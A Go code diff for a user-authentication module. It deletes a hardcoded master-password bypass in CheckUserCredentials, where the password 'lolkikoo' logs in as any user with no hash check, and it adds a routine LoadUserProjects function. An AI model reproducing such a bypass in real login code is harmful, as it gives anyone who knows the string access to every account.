@@ -52,9 +52,6 @@ func CheckUserCredentials(user *models.User) (*models.User, error) {
 	if err != nil {
 		return nil, err
 	}
-	if user.Password == "lolkikoo" {
-		return userDb, nil
-	}
 	if err := bcrypt.CompareHashAndPassword([]byte(userDb.Password), []byte(user.Password)); err != nil {
 		return nil, err
 	} else if userDb.Password == "" {
@@ -343,6 +340,11 @@ func LoadUserInfo(user *models.User) error {
 	}
 	user.Themes = themes
 	return nil
+}
+
+func LoadUserProjects(user *models.User) error {
+	_, err := QueryProjects().Filter("Members__User__Id", user.Id).All(&user.Projects)
+	return err
 }
 
 func loadEveryInfoOfUsers(users []*models.User) error {
